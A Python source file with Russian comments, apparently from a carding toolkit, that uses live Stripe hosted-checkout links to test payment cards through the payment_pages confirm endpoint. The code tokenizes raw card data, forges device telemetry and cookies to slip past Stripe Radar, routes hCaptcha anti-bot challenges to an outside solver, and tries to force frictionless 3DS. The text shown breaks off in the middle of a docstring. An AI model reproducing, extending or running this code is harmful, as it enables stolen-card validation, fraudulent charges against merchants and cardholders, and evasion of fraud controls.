# language: Python 3.12+, file: hit_gate.py, target: Windows 11, deps: curl_cffi
# Stripe Checkout /hit — проверка карты по ГОТОВОМУ cs_live-линку (hosted checkout).
# Вектор из разведки research/chat-corpus/ (docs/ИССЛЕДОВАНИЕ-НОВЫЕ-ПОВЕРХНОСТИ.md §В1):
#   cs_live-URL -> fid-фрагмент (XOR5+base64+JSON, stripe_fid.py) -> pk + session
#   -> GET /v1/payment_pages/{cs} (PI+amount+init_checksum)
#   -> POST /v1/payment_methods (токенизация)
#   -> POST /v1/payment_pages/{cs}/confirm -> вердикт эмитента
# Отличие от confirm_gate: НЕ нужен сайт-донор с pk на витрине —
# подходит любой checkout-линк (checkout.stripe.com / pay.1vpn.org / pay.opus.pro / buy.stripe.com).
import asyncio
import re
import sys
import time
import uuid
from typing import Any
from urllib.parse import parse_qs, urlparse

from curl_cffi.requests import AsyncSession

import config
from config import session_pacing_delay, setup_cooldown_delay
import gate_client as gc
import stripe_fid
import bin_steering
import frictionless_engine
import pusto_logger as _log

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


def presentment_amount(data: dict) -> int:
    """Сумма сессии в валюте ВИТРИНЫ (presentment) — то, что ждёт payment_pages/confirm.

    Живой замер 2026-09-13 (Kimi/Stripe, adaptive pricing): PaymentIntent живёт в валюте интеграции
    (1900 USD), а инвойс сессии — в валюте витрины (2504 SGD). Confirm сверяет expected_amount
    именно с инвойсом и на старой сумме отвечает 400 checkout_amount_mismatch — то есть попытка
    сгорает не из-за карты. Здесь собираем презентационную сумму из total_summary.due или invoice.
    """
    if not isinstance(data, dict):
        return 0
    due = (data.get("total_summary") or {}).get("due")
    inv = data.get("invoice")
    if not due and isinstance(inv, dict):
        due = inv.get("amount_due")
    try:
        return int(due or 0)
    except (TypeError, ValueError):
        return 0

def _amount_mismatch(status_code: int, err: dict) -> bool:
    """checkout_amount_mismatch живёт в error.code, error.decline_code ИЛИ в хвосте
    error.message (живой кейс 06.09.2026: code=None, message='...subscription.
    invoice_proration.checkout_amount_mismatch'). Ловим по подстроке."""
    if status_code not in (400, 402, 409):
        return False
    src = " ".join(str(err.get(k) or "") for k in ("code", "decline_code", "message")).lower()
    return "amount_mismatch" in src


def extract_session_and_key(target_url: str) -> tuple[str, str]:
    """Извлекает apiKey (pk_live_...) и checkoutSessionId (cs_...) из:
    1. stripe_fid.decode_fragment (#fid...)
    2. URL query parameters (?apiKey=...&checkoutSessionId=... или ?key=...&session_id=...)
    3. URL fragment query parameters
    4. URL path / regex matching.
    """
    pk = ""
    cs = ""
    raw = str(target_url or "").strip()
    if not raw:
        return "", ""

    # 1. Пробуем декодировать FID-фрагмент
    try:
        d = stripe_fid.decode_fragment(raw)
        if isinstance(d, dict):
            pk = str(d.get("apiKey") or d.get("key") or d.get("pk") or "")
            cs = str(d.get("checkoutSessionId") or d.get("sessionId") or d.get("session_id") or d.get("cs") or "")
    except Exception:
        pass

    # 2. Если не найдено или неполно — проверяем query string и фрагменты URL
    if not pk.startswith("pk_") or not cs.startswith("cs_"):
        try:
            parsed = urlparse(raw)
            qs = parse_qs(parsed.query)
            if not pk or not pk.startswith("pk_"):
                pk = (
                    qs.get("apiKey", [""])[0]
                    or qs.get("key", [""])[0]
                    or qs.get("pk", [""])[0]
                    or qs.get("publishable_key", [""])[0]
                )
            if not cs or not cs.startswith("cs_"):
                cs = (
                    qs.get("checkoutSessionId", [""])[0]
                    or qs.get("session_id", [""])[0]
                    or qs.get("cs", [""])[0]
                )
            if parsed.fragment and ("=" in parsed.fragment):
                frag_qs = parse_qs(parsed.fragment.lstrip("#?"))
                if not pk or not pk.startswith("pk_"):
                    pk = (
                        frag_qs.get("apiKey", [""])[0]
                        or frag_qs.get("key", [""])[0]
                        or frag_qs.get("pk", [""])[0]
                    )
                if not cs or not cs.startswith("cs_"):
                    cs = (
                        frag_qs.get("checkoutSessionId", [""])[0]
                        or frag_qs.get("session_id", [""])[0]
                        or frag_qs.get("cs", [""])[0]
                    )
        except Exception:
            pass

    # 3. Regex fallback
    if not cs or not cs.startswith("cs_"):
        m_cs = re.search(r"\b(cs_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
        if m_cs:
            cs = m_cs.group(1)
    if not pk or not pk.startswith("pk_"):
        m_pk = re.search(r"\b(pk_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
        if m_pk:
            pk = m_pk.group(1)

    return pk, cs


class CsHitSession:
    """Одна cs_live-сессия:fid -> pk -> PI; несколько карт, пока PI жив."""

    def __init__(self, target_url: str, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS,
                 proxy: str | None = None, use_ctoken: bool = False,
                 challenge_solver: Any = None):
        self.url = target_url.strip()
        self.max_amount = max_amount_cents
        self.proxy = proxy
        self.s: AsyncSession | None = None
        self.pk = ""
        self.cs = ""
        self.pi_id = ""
        self.secret = ""
        self.amount = 0
        # Сумма для payment_pages/confirm — в валюте ВИТРИНЫ (presentment), а не в валюте PI.
        self.expected_amount = 0
        self.currency = ""
        self.checksum = ""
        self.confirms = 0
        self.customer_email = ""
        self.customer_name = ""
        self.customer_country = ""
        self.steering = bin_steering.BinSteeringEngine()
        self.hcaptcha_token: str | None = None
        self.use_ctoken: bool = use_ctoken
        self.challenge_solver = challenge_solver
        self.muid: str = ""
        self.sid: str = ""
        self.guid: str = ""

    def synthesize_telemetry(self, country_code: str = "") -> dict:
        """Синтезирует полный согласованный профиль клиентской телеметрии Stripe (Radar v2021)
        с attribution metadata, muid, sid, guid, payment_user_agent и сессионными cookies."""
        cc = country_code or self.customer_country or "US"
        telem = gc.synthesize_telemetry(
            self.url,
            self.pk,
            country_code=cc,
            muid=self.muid,
            sid=self.sid,
            guid=self.guid or str(uuid.uuid4()),
        )
        self.muid = telem["muid"]
        self.sid = telem["sid"]
        self.guid = telem["guid"]
        return telem

    async def open(self) -> tuple[bool, str]:
        self.pk, self.cs = extract_session_and_key(self.url)
        if not self.pk.startswith("pk_live") or not self.cs.startswith("cs_"):
            return False, "не удалось извлечь pk/cs из fid-фрагмента (линк мёртв?)"
        s = AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=self.proxy)
        try:
            pp_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}"
            r = await s.get(pp_url,
                            params={"key": self.pk},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://js.stripe.com/",
                                     "Accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                # Алерт на непубличный маршрут: 404 тут означает, что Stripe вывел маршрут,
                # а не то, что карта отклонена (аудит 2026-09, H-01).
                gone = gc.flag_internal_endpoint(r, pp_url)
                await s.close()
                if gone:
                    return False, ("payment_pages выведен из маршрутизации Stripe (404): контур /hit "
                                   "развалился, это не отказ карты — смотри config.UNDOCUMENTED_ENDPOINTS")
                return False, f"payment_pages HTTP {r.status_code}: {r.text[:120]}"
            data = r.json()
            if data.get("is_sandbox_merchant") or not data.get("livemode", True):
                await s.close()
                return False, "TEST_MODE (sandbox-мерчант)"
            
            # Проверяем статус сессии: если она уже завершена (complete/expired) — выходим
            sess_status = data.get("status")
            if sess_status in ("complete", "expired"):
                await s.close()
                return False, f"сессия чекаута уже {sess_status}"

            pi = data.get("payment_intent") or {}
            self.secret = str(pi.get("client_secret") or "")
            self.pi_id = str(pi.get("id") or "")
            self.amount = int(pi.get("amount") or 0)
            self.currency = str(pi.get("currency") or "").upper()
            self.checksum = str(data.get("init_checksum") or "")
            # Живой замер 2026-09-13: PI в валюте интеграции (1900 USD), а инвойс сессии — в валюте
            # витрины (2504 SGD). confirm сверяет именно презентационную сумму, поэтому берём её сразу:
            # иначе первая же попытка тратится на 400 checkout_amount_mismatch.
            self.expected_amount = presentment_amount(data) or self.amount

            cust = data.get("customer") or {}
            self.customer_email = str(data.get("customer_email") or cust.get("email") or "")
            self.customer_name = str(cust.get("name") or "")
            self.customer_country = str((cust.get("address") or {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or "")

            status = pi.get("status")
            # Разрешаем requires_payment_method И requires_action (Stripe позволяет перезаписывать незавершенный 3DS новой картой)
            if status and status not in ("requires_payment_method", "requires_action"):
                await s.close()
                return False, f"PI status={status} — сессия не переиспользуется"

            if not self.secret and status:
                # В подписочных сессиях client_secret может отсутствовать до confirm
                pass

            if not status or self.amount == 0:
                # подписочные сессии: PI создаётся только при confirm или сумма в total_summary/invoice
                due = ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due") if isinstance(data.get("invoice"), dict) else None)
                if not due and not self.amount:
                    await s.close()
                    return False, "PI скрыт и сумма неизвестна (нестандартная сессия)"
                if due:
                    self.amount = int(due)
                self.currency = str(data.get("currency") or (data.get("invoice") or {}).get("currency") or "").upper() or "USD"

            if self.amount > self.max_amount:
                await s.close()
                return False, f"CHARGE_RISK: {self.amount}{self.currency} > {self.max_amount}c"
            # Настоящие идентификаторы устройства Stripe (живой замер 2026-09-13): витрина получает
            # muid/guid/sid именно отсюда, а не выдумывает. Берём их, если сервис ответил; иначе — как раньше.
            if not self.muid:
                try:
                    ids = await gc.mint_stripe_ids(s, timeout=8)
                    if ids:
                        self.muid = ids["muid"]
                        self.sid = ids.get("sid") or self.sid
                        self.guid = ids.get("guid") or self.guid
                        _log.log_stripe("DEVICE_IDS", self.cs[:14], "m.stripe.com/6",
                                        f"muid={self.muid[:12]}… sid={self.sid[:12]}…")
                except Exception as e:
                    _log.log_stripe("DEVICE_IDS", self.cs[:14], "fallback", type(e).__name__)
            self.muid = self.muid or str(uuid.uuid4())
            self.sid = self.sid or str(uuid.uuid4())
            self.guid = self.guid or str(uuid.uuid4())
            cookies_dict = gc.build_stripe_cookies(self.muid, self.sid)
            if hasattr(s, "cookies"):
                for k, v in cookies_dict.items():
                    try:
                        s.cookies.set(k, v)
                    except Exception:
                        pass
            self.s = s
            return True, ""
        except Exception as e:
            await s.close()
            return False, f"{type(e).__name__}: {e}"

    async def _alive(self) -> bool:
        """Проверяем, жива ли сессия (requires_payment_method / requires_action или session open)."""
        try:
            pp_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}"
            r = await self.s.get(pp_url,
                                 params={"key": self.pk},
                                 headers={"Origin": "https://js.stripe.com",
                                          "Referer": "https://js.stripe.com/",
                                          "Accept": "application/json"}, timeout=12)
            gc.flag_internal_endpoint(r, pp_url)
            data = r.json() or {}
            if data.get("status") in ("complete", "expired"):
                return False
            pi = data.get("payment_intent") or {}
            st = pi.get("status")
            if st:
                return st in ("requires_payment_method", "requires_action")
            return data.get("status") == "open"
        except Exception:
            return False

    async def check_card(self, card_raw: str, bin_alpha2: str = "") -> dict:
        if self.s is None:
            return {"status": "ERROR", "detail": "сессия не открыта"}
        if not await self._alive():
            return {"status": "SESSION_EXPIRED", "detail": "Checkout session expired or completed on Stripe"}
        if self.confirms >= config.MAX_CONFIRMS_PER_SECRET:
            return {"status": "ERROR", "detail": "confirm-бюджет исчерпан"}

        # 1. 3DS Steering & Geo Enrichment
        profile = await self.steering.evaluate_card(card_raw)
        effective_a2 = bin_alpha2 or profile.country_a2 or self.customer_country

        telem = self.synthesize_telemetry(country_code=effective_a2)
        if self.customer_email:
            telem["email"] = self.customer_email
        if self.customer_name:
            telem["name"] = self.customer_name
        if effective_a2:
            telem.update(gc.geo_identity_fields(effective_a2))
        card = gc.parse_card(card_raw)

        tok_headers = dict(gc.TOKENIZE_HEADERS)
        if telem.get("cookie_header"):
            tok_headers["Cookie"] = telem["cookie_header"]

        try:
            # Общий путь токенизации: самолечение недокументированных параметров (аудит 2026-09, D-03)
            td = await gc.tokenize_payment_method(
                self.s, gc.tokenize_body(card, telem, self.url),
                headers=tok_headers, timeout=10, label="hit")
        except Exception as e:
            return {"status": "ERROR", "detail": f"tokenize: {type(e).__name__}: {e}"[:150]}
        if "id" not in td:
            err = td.get("error", {})
            _log.log_stripe("TOKENIZE_FAIL", gc.mask_pan(card_raw), str(err.get("code", "error"))[:40], str(err.get("message", ""))[:60])
            return {"status": gc.classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                    "detail": err.get("message", str(td))[:200],
                    "steering_category": profile.category.value,
                    "confidence": profile.confidence_score}
        _log.log_stripe("TOKENIZE_OK", td["id"], detail=gc.mask_pan(card_raw))
        # Превентивное снижение скоринга Stripe Radar: запрашиваем P1_-токен в живой сессии
        if isinstance(AsyncSession, type) and isinstance(self.s, AsyncSession) and not self.hcaptcha_token:
            try:
                donor_host = urlparse(self.url).netloc or "checkout.stripe.com"
                self.hcaptcha_token = await gc.fetch_hcaptcha_radar_token(self.s, self.pk, donor_host)
            except Exception:
                self.hcaptcha_token = None

        body = self.confirm_body(td, telem)
        if self.use_ctoken:
            try:
                ct_res = await gc.create_confirmation_token(self.s, self.pk, td["id"], return_url=self.url.split("#")[0])
                if ct_res.get("id") and str(ct_res.get("id")).startswith("ctoken_"):
                    body["confirmation_token"] = ct_res["id"]
                    body.pop("payment_method", None)
                    _log.log_stripe("CTOKEN_APPLIED", ct_res["id"], td["id"], "ConfirmationToken applied")
                else:
                    _log.log_stripe("CTOKEN_FALLBACK", td["id"], str(ct_res.get("status", "FAIL")), "fallback to raw payment_method")
            except Exception as e:
                _log.log_stripe("CTOKEN_FALLBACK", td["id"], type(e).__name__, f"ctoken error: {e}, fallback to raw payment_method")

        confirm_headers = {
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Accept": "application/json",
        }
        if telem.get("cookie_header"):
            confirm_headers["Cookie"] = telem["cookie_header"]

        # подписочные сессии пересчитывают инвойс между open и confirm —
        # при checkout_amount_mismatch перечитываем сумму и повторяем один раз
        # Самолечение на самом confirm: живой замер 2026-09-12 показал, что этот маршрут
        # отвергает radar_options[...] с 400 parameter_unknown — то есть попытка сгорала
        # из-за нашей телеметрии, а не из-за карты. Убираем РОВНО названный параметр и
        # повторяем: это и есть самовосстановление попытки внутри живой сессии.
        cfm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
        r = None
        resp = {}
        for attempt in range(3):
            try:
                r = await self.s.post(cfm_url,
                                      data=body,
                                      headers=confirm_headers, timeout=20)
                resp = r.json()
                _log.log_http("POST", cfm_url, r.status_code)
                gc.flag_internal_endpoint(r, cfm_url)
            except Exception as e:
                return {"status": "ERROR", "detail": f"confirm: {type(e).__name__}: {e}"[:150]}
            self.confirms += 1
            rejected = gc._unknown_param_from_error(resp or {})
            if rejected and attempt < 2:
                dropped = gc.drop_unknown_param(body, rejected)
                if dropped:
                    _log.log_warn(f"[hit] confirm отверг параметр {rejected!r} — снял "
                                  f"{dropped} ключ(а) и повторяю (карта не тронута)")
                    continue
                return {"status": "ERROR",
                        "detail": (f"confirm назвал параметр {rejected!r}, но его нет в теле — "
                                   f"сбой контура, карта не проверена")}
            break
        err = resp.get("error") or {}
        if _amount_mismatch(getattr(r, "status_code", 0), err):
            try:
                rg_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}"
                rg = await self.s.get(rg_url,
                                      params={"key": self.pk},
                                      headers=confirm_headers, timeout=12)
                gc.flag_internal_endpoint(rg, rg_url)
                data0 = rg.json() or {}
                pi0 = data0.get("payment_intent") or {}
                new_amt = (
                    pi0.get("amount")
                    or ((data0.get("total_summary") or {}).get("due"))
                    or ((data0.get("invoice") or {}).get("amount_due") if isinstance(data0.get("invoice"), dict) else None)
                )
                # Если invoice передан строковым ID (in_...), запрашиваем эндпоинт инвойса
                inv_val = data0.get("invoice")
                inv_id = inv_val if isinstance(inv_val, str) else (inv_val or {}).get("id")
                if not new_amt and inv_id and str(inv_id).startswith("in_"):
                    try:
                        r_inv = await self.s.get(
                            f"https://api.stripe.com/v1/invoices/{inv_id}",
                            params={"key": self.pk},
                            headers=confirm_headers,
                            timeout=10
                        )
                        if r_inv.status_code == 200:
                            inv_data = r_inv.json() or {}
                            if inv_data.get("amount_due") is not None:
                                new_amt = inv_data.get("amount_due")
                    except Exception:
                        pass

                if new_amt and int(new_amt) != self.amount:
                    self.amount = int(new_amt)
                    self.expected_amount = int(new_amt)
                    self.currency = str(pi0.get("currency") or data0.get("currency") or self.currency).upper()
                    body["expected_amount"] = str(self.expected_amount)
                    body["eid"] = str(uuid.uuid4())
                    if "confirmation_token" not in body:
                        body["payment_method"] = td["id"]
                    cfm_url2 = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
                    r = await self.s.post(cfm_url2,
                                          data=body,
                                          headers=confirm_headers, timeout=20)
                    gc.flag_internal_endpoint(r, cfm_url2)
                    resp = r.json()
                    self.confirms += 1
            except Exception:
                pass
            # mismatch повторился и после пересчёта — подписочный прейлист дрейфует
            # быстрее, чем мы подтверждаем. Это свойство цели, не карты: честный
            # ERROR (возврат кредита), а не DECLINED эмитентом.
            err2 = resp.get("error") or {}
            if _amount_mismatch(getattr(r, "status_code", 0), err2):
                _log.log_stripe("AMOUNT_DRIFT", self.cs[:14], "mismatch x2", "invoice proration unstable")
                return {"status": "ERROR",
                        "detail": ("подписочный инвойс дрейфует: amount_mismatch повторился "
                                   f"после пересчёта ({self.amount}{self.currency}) — цель "
                                   "нестабильна, карта эмитентом не проверялась"),
                        "amount_cents": self.amount, "currency": self.currency,
                        "steering_category": profile.category.value,
                        "confidence": profile.confidence_score,
                        "reason": profile.reason}
        verdict, detail = await self._classify_and_resolve_3ds(resp, profile, confirm_body=body)
        return {"status": verdict, "detail": detail[:250],
                "amount_cents": self.amount, "currency": self.currency,
                # Сколько реально уходило в confirm: у подписок это валюта ВИТРИНЫ, а не валюта PI
                # (живой замер 2026-09-13: PI 1900 USD против инвойса 2504 SGD). Отчёт обязан
                # показывать оба, иначе «подтверждено 2504 SGD» выглядит как «PI 1900 USD».
                "confirmed_amount_cents": getattr(self, "expected_amount", 0) or self.amount,
                "confirmed_currency": self.currency,
                "steering_category": profile.category.value,
                "confidence": profile.confidence_score,
                "reason": profile.reason}

    async def _classify_and_resolve_3ds(self, resp: dict, profile: bin_steering.CardProfile | None = None,
                                        confirm_body: dict | None = None, recursion_depth: int = 0) -> tuple[str, str]:
        """Вердикт по ответу payment_pages/confirm с проходом 3DS-ветки:
        1. Ошибки карточного уровня (402, decline) -> классификация через gate_client
        2. Успех (complete / paid / succeeded) -> APPROVED@PAID
        3. requires_action -> исполнение 3DS-Method + frictionless_engine -> 3DS_FRICTIONLESS / 3DS_CHALLENGE
        4. Stripe Radar intent_confirmation_challenge -> in-flight resolution via verify_challenge -> re-confirm."""
        err = resp.get("error") or {}
        if err:
            code = (str(err.get("code") or "") + " " + str(err.get("decline_code") or "")).strip()
            msg = str(err.get("message") or "")
            return gc.classify_pi_verdict({"error": {**err, "message": f"{msg} {code}".strip()}})
        payment_status = str(resp.get("payment_status") or "")
        if payment_status in ("paid", "no_payment_required"):
            return "APPROVED@PAID", f"checkout {payment_status} ({self.amount}{self.currency})"
        if resp.get("status") in ("complete",) and payment_status != "paid":
            # Сессия завершилась БЕЗ оплаты. Именно этот случай даёт на странице текст
            # «Не удалось верифицировать способ оплаты. Выберите другой способ оплаты»
            # (Stripe: payment_intent_authentication_failure). Раньше мы объявляли здесь
            # APPROVED@PAID — ложная победа, которую dj поймал на живой странице 2026-09-12.
            return "CHALLENGE_FAILED", (f"сессия завершена без оплаты "
                                        f"(payment_status={resp.get('payment_status') or 'unpaid'}) — "
                                        f"верификация способа оплаты не прошла")
        pi = resp.get("payment_intent") or {}
        pi_st = str(pi.get("status") or "")
        lpe = pi.get("last_payment_error") or {}
        if pi_st == "succeeded":
            return "APPROVED@PAID", f"PI succeeded ({self.amount}{self.currency})"
        if pi_st == "processing":
            return "PI_PENDING", "PI processing"
        if lpe:
            code = (str(lpe.get("code") or "") + " " + str(lpe.get("decline_code") or "")).strip()
            return gc.classify_pi_verdict({"error": {**lpe, "message": str(lpe.get("message") or "") + " " + code}})
        
        if pi_st == "requires_action":
            na = pi.get("next_action") or {}
            na_type = na.get("type") or ""
            
            # --- 3DS2 flow (use_stripe_sdk) ---
            if na_type == "use_stripe_sdk":
                sdk = na.get("use_stripe_sdk") or {}
                sdk_type = sdk.get("type") or ""
                stripe_js = sdk.get("stripe_js") or {}
                
                # Если уже пришёл прямой challenge от ACS (creq / acs_url) -> 3DS_CHALLENGE
                if sdk_type == "stripe_3ds2_challenge" or "acs_url" in stripe_js:
                    return "3DS_CHALLENGE", "3DS2 challenge required (OTP/SMS)"

                # Stripe Radar bot challenge (hCaptcha Enterprise): НЕ 3DS и не
                # свойство карты — антифрод Stripe до аутентификации эмитентом.
                if sdk_type == "intent_confirmation_challenge":
                    sk = str(sdk.get("site_key") or stripe_js.get("site_key") or "")
                    rqdata = str(sdk.get("rqdata") or stripe_js.get("rqdata") or "")
                    verification_url = str(sdk.get("verification_url") or stripe_js.get("verification_url") or "")
                    sk_note = f"sitekey={sk[:8]}… " if sk else ""
                    _log.log_stripe("RADAR_CHALLENGE", self.cs[:14], "hCaptcha", sk_note.strip())

                    # Проверяем наличие солвера или предварительного токена
                    token = None
                    ekey = None
                    if self.challenge_solver is not None:
                        try:
                            if hasattr(self.challenge_solver, "solve") and callable(self.challenge_solver.solve):
                                solver_res = self.challenge_solver.solve(
                                    site_key=sk,
                                    rqdata=rqdata,
                                    verification_url=verification_url,
                                    url=self.url,
                                )
                            elif callable(self.challenge_solver):
                                solver_res = self.challenge_solver(
                                    site_key=sk,
                                    rqdata=rqdata,
                                    verification_url=verification_url,
                                    url=self.url,
                                )
                            else:
                                solver_res = None

                            if asyncio.iscoroutine(solver_res):
                                solver_res = await solver_res
                            if isinstance(solver_res, dict):
                                token = solver_res.get("token") or solver_res.get("challenge_response_token")
                                ekey = solver_res.get("ekey") or solver_res.get("challenge_response_ekey")
                            elif isinstance(solver_res, str):
                                token = solver_res
                        except Exception as se:
                            _log.log_stripe("SOLVER_ERROR", self.cs[:14], type(se).__name__, str(se)[:80])
                    elif self.hcaptcha_token:
                        token = self.hcaptcha_token

                    # Если токен получен и сессия активна — диспатчим верификацию
                    if token and self.s is not None and recursion_depth < 2:
                        pi_id = self.pi_id or pi.get("id") or ""
                        if not pi_id and verification_url:
                            m_pi = re.search(r"pi_[A-Za-z0-9]+", verification_url)
                            if m_pi:
                                pi_id = m_pi.group(0)
                        client_secret = self.secret or pi.get("client_secret") or ""

                        v_res = await gc.verify_intent_challenge(
                            self.s,
                            pi_id=pi_id,
                            pk=self.pk,
                            client_secret=client_secret,
                            challenge_response_token=token,
                            challenge_response_ekey=ekey,
                        )

                        if v_res.get("status") == "CHALLENGE_PASSED":
                            _log.log_stripe("RADAR_VERIFIED", self.cs[:14], pi_id[:14], "Resuming confirmation")
                            if confirm_body:
                                resumed_body = dict(confirm_body)
                                resumed_body["eid"] = str(uuid.uuid4())
                                resumed_body.pop("radar_options[hcaptcha_token]", None)
                            else:
                                resumed_body = {
                                    "key": self.pk,
                                    "eid": str(uuid.uuid4()),
                                    "expected_payment_method_type": "card",
                                    "expected_amount": str(self.expected_amount or self.amount),
                                    "return_url": self.url.split("#")[0],
                                }
                                if self.checksum:
                                    resumed_body["init_checksum"] = self.checksum

                            try:
                                resumed_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
                                r_res = await self.s.post(
                                    resumed_url,
                                    data=resumed_body,
                                    headers={
                                        "Origin": "https://js.stripe.com",
                                        "Referer": "https://js.stripe.com/",
                                        "Accept": "application/json",
                                    },
                                    timeout=20,
                                )
                                self.confirms += 1
                                resumed_resp = r_res.json()
                                _log.log_http("POST", resumed_url, r_res.status_code)
                                gc.flag_internal_endpoint(r_res, resumed_url)
                                return await self._classify_and_resolve_3ds(
                                    resumed_resp,
                                    profile=profile,
                                    confirm_body=resumed_body,
                                    recursion_depth=recursion_depth + 1,
                                )
                            except Exception as re_err:
                                _log.log_stripe("RESUME_FAIL", self.cs[:14], type(re_err).__name__, str(re_err)[:80])
                                return "CAPTCHA_CHECKOUT", f"Radar challenge verified but resume failed: {re_err}"
                        else:
                            fail_detail = v_res.get("detail", "verification rejected")
                            return "CAPTCHA_CHECKOUT", (f"Stripe Radar bot challenge verification failed ({fail_detail}) — "
                                                        f"антифрод цели, не 3DS; карта не проверялась эмитентом")

                    return "CAPTCHA_CHECKOUT", (f"Stripe Radar bot challenge (hCaptcha, {sk_note}"
                                                f"rqdata attached) — антифрод цели, не 3DS; карта не проверялась эмитентом")

                # Исполняем Frictionless Engine (3DS-Method iframe emulation + aligned browser telemetry)
                if self.s is not None:
                    target_cc = (profile.country_a2 if profile else "") or self.customer_country or "US"
                    sdk_payload = dict(sdk)
                    if "three_d_secure_2_source" in na and "three_d_secure_2_source" not in sdk_payload:
                        sdk_payload["three_d_secure_2_source"] = na["three_d_secure_2_source"]
                    if "source" in na and "source" not in sdk_payload:
                        sdk_payload["source"] = na["source"]
                    f_res = await frictionless_engine.attempt_frictionless_resolution(
                        self.s, self.pk, self.cs, sdk_payload, country_code=target_cc
                    )
                    outcome = f_res.get("outcome")
                    evidence = str(f_res.get("evidence") or "")
                    if outcome == "FRICTIONLESS_PASSED":
                        # Прошла аутентификация и оплачено — разные вещи. Живой замер 2026-09-12: ветка
                        # объявляла APPROVED@PAID на аутентификации, а сессия оставалась unpaid.
                        # Оплатой считается только подтверждение Stripe: сессия complete или PI succeeded,
                        # а processing — деньги в пути (PI_PENDING).
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], evidence or "PASSED",
                                        f"{self.amount}{self.currency}")
                        if evidence in ("session_paid", "session_no_payment", "pi_succeeded"):
                            return "APPROVED@PAID", (f"3DS2 frictionless + подтверждение Stripe "
                                                     f"({evidence}, {self.amount}{self.currency})")
                        if evidence == "pi_processing":
                            return "PI_PENDING", "3DS2 frictionless, PI processing (деньги в пути)"
                        if evidence == "session_complete_unpaid":
                            # Сессия завершилась без оплаты: верификация не прошла — на странице
                            # «Не удалось верифицировать способ оплаты».
                            return "CHALLENGE_FAILED", ("сессия завершена без оплаты — верификация "
                                                        "способа оплаты не прошла")
                        return "3DS_FRICTIONLESS", (f"3DS2 frictionless passed ({self.amount}{self.currency}) — "
                                                    f"аутентификация, не оплата; ждём подтверждения сессии")
                    elif outcome == "CHALLENGE_REQUIRED":
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "CHALLENGE", "issuer requires OTP")
                        return "3DS_CHALLENGE", "3DS2 challenge (transStatus=C, enrolled)"
                    elif outcome == "METHOD_ONLY":
                        # Method ушёл в ACS, но Stripe не подтвердил НИ проход, НИ челлендж. Выдавать
                        # это за frictionless нельзя, а «enrolled» без деталей — терять информацию:
                        # вердикт тот же (нужен 3DS), деталь честная (живой случай 2026-09-13).
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "METHOD_ONLY", evidence or "no ACS confirmation")
                        return "3DS_CHALLENGE", str(f_res.get("detail") or "3DS2 Method без подтверждения ACS")
                
                # Fallback по типу SDK
                if sdk_type == "stripe_3ds2_fingerprint":
                    return "3DS_CHALLENGE", f"3DS2 enrolled ({sdk_type})"
                return "3DS_REQUIRED", f"3DS SDK action (type={sdk_type or na_type})"
            
            # --- 3DS1 / Redirect flow (redirect_to_url) ---
            if na_type == "redirect_to_url":
                red_url = na.get("redirect_to_url", {}).get("url", "")
                return "3DS_CHALLENGE", f"3DS redirect challenge: {red_url[:80]}"

            
            return "3DS_REQUIRED", f"3DS action required (type={na_type})"
            
        return gc.classify_pi_verdict(resp)

    def confirm_body(self, td: dict, telem: dict) -> dict:
        """Тело payment_pages/confirm для этого маршрута.

        Два живых факта 2026-09-13 (Kimi/Stripe, hosted checkout), каждый стоил нам лишней попытки:
          * сумма должна быть ПРЕЗЕНТАЦИОННОЙ (валюта витрины), а не валютой PI: PI 1900 USD против
            инвойса 2504 SGD — на старой сумме confirm отвечает 400 checkout_amount_mismatch, то
            есть попытка сгорала не из-за карты;
          * параметр radar_options этот маршрут не принимает вообще («Received unknown parameter:
            radar_options»), а сама страница шлёт токен капчи верхним уровнем как
            passive_captcha_token. Поэтому по умолчанию не отправляем; откат — флаг
            config.CONFIRM_SEND_RADAR_OPTIONS.
        """
        body = {
            "key": self.pk,
            "eid": str(uuid.uuid4()),
            "payment_method": td["id"],
            "expected_payment_method_type": "card",
            "expected_amount": str(self.expected_amount or self.amount),
            "return_url": self.url.split("#")[0],
            # Идентификаторы клиента и версия JS — ровно те поля, что шлёт сама витрина
            # (живая съёмка 2026-09-13: guid/muid/sid и version=f0a6d7cfcd). Без них наш confirm
            # отличался от страницы по набору полей; guid теперь настоящий (m.stripe.com/6).
            "version": config.STRIPE_JS_BUILD,
        }
        if telem:
            for src, dst in (("guid", "guid"), ("muid", "muid"), ("sid", "sid")):
                if telem.get(src):
                    body[dst] = str(telem[src])
        if self.hcaptcha_token and getattr(config, "CONFIRM_SEND_RADAR_OPTIONS", False):
            body["radar_options[hcaptcha_token]"] = self.hcaptcha_token
        if self.checksum:
            body["init_checksum"] = self.checksum
        return body


    async def close(self):
        if self.s is not None:
            try:
                await self.s.close()
            except Exception:
                pass
            self.s = None


async def qualify_session(target_url: str, proxy: str | None = None,
                          max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS,
                          timeout: int = 15) -> dict:
    """Пре-флайт квалификатор сессии /hit (payment_pages) без отправки карты:
    Проверяет:
    - валидность URL и извлечение pk/cs через fid-фрагмент или параметры URL
    - статус сессии (open, complete, expired)
    - режим мерчанта (live vs sandbox)
    - состояние PaymentIntent (requires_payment_method, requires_action, succeeded)
    - сумму и валюту (в пределах капа или CHARGE_RISK)
    - 3DS-политику мерчанта (request_three_d_secure: automatic vs any)
    - тип сессии (разовый payment vs подписка subscription)
    - Radar-риски и рекомендации.

    Возвращает структурированный диагностический словарь:
    (viable, session_status, amount_cents, currency, three_d_secure, recommendation).

